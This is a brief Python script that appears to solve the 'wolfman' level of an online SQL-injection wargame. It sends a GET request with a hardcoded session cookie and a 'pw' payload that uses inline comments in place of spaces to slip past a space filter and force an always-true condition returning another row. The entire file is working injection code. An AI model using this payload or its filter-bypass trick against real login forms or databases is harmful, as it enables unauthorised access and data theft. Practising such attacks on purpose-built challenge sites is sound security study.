import requests

cookies = {"PHPSESSID": "p2tucjmoqghg78656vgmf7g03p"}

url = "https://los.rubiya.kr/chall/wolfman_4fdc56b75971e41981e3d1e2fbe9b7f7.php"

payload = "'/**/or/**/'1'='1'/**/limit/**/1,1#"
params = {"pw": payload}

r = requests.get(url, params=params, cookies=cookies)
print(r.text)